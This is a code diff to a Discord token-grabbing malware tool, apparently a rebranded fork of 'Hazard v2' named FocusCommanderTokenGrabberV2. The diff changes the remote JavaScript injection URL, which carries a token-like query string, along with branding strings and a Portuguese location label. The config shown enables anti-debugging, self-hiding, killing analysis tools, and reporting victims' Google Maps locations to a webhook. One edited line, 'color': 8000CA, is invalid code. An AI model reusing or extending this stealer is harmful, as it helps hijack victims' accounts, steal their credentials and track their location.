@@ -32,8 +32,8 @@ __config__ = {
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
-    'injection_url': "https://raw.githubusercontent.com/DaddyScr/FocusGB/main/main.js",
-    # if True, it will ping @everyone when someone ran Hazard v2
+    'injection_url': "https://raw.githubusercontent.com/DaddyScr/TKFocus/main/main.js?token=GHSAT0AAAAAABSWKGGYIMCOWOND5CZZS4J4YVVBQQQ",
+    # if True, it will ping @everyone when someone ran
     'ping_on_run': False,
     # set to False if you don't want it to kill programs such as discord upon running the exe
     'kill_processes': False,
@@ -43,7 +43,7 @@ __config__ = {
     'hide_self': True,
     # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
     'anti_debug': True,
-    # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
+    # this list of programs will be killed if fscmd detects that any of these are running, you can add more if you want
     'blackListedPrograms':
     [
         "httpdebuggerui",
@@ -357,7 +357,7 @@ class FocusCommanderTokenGrabberV2(Functions):
             x = self.hook_reg
             with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                 txt = f.read()
-                content = txt.replace(x, 'RdimoTheGoat')
+                content = txt.replace(x, 'FocusStore')
             with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                 f.write(content)
 
@@ -643,8 +643,8 @@ GoogleMaps: {self.googlemap}
                         'url': 'https://discord.gg/invite/focusstore',
                         'icon_url': 'https://cdn.discordapp.com/icons/979152298309726208/a_6b766503e5163e2880b900f2c7f2121c.gif'
                     },
-                    'color': 176185,
-                    'description': f'[Google Maps Location]({self.googlemap})',
+                    'color': 8000CA,
+                    'description': f'[Localização do Google Maps]({self.googlemap})',
                     'fields': [
                         {
                             'name': '\u200b',
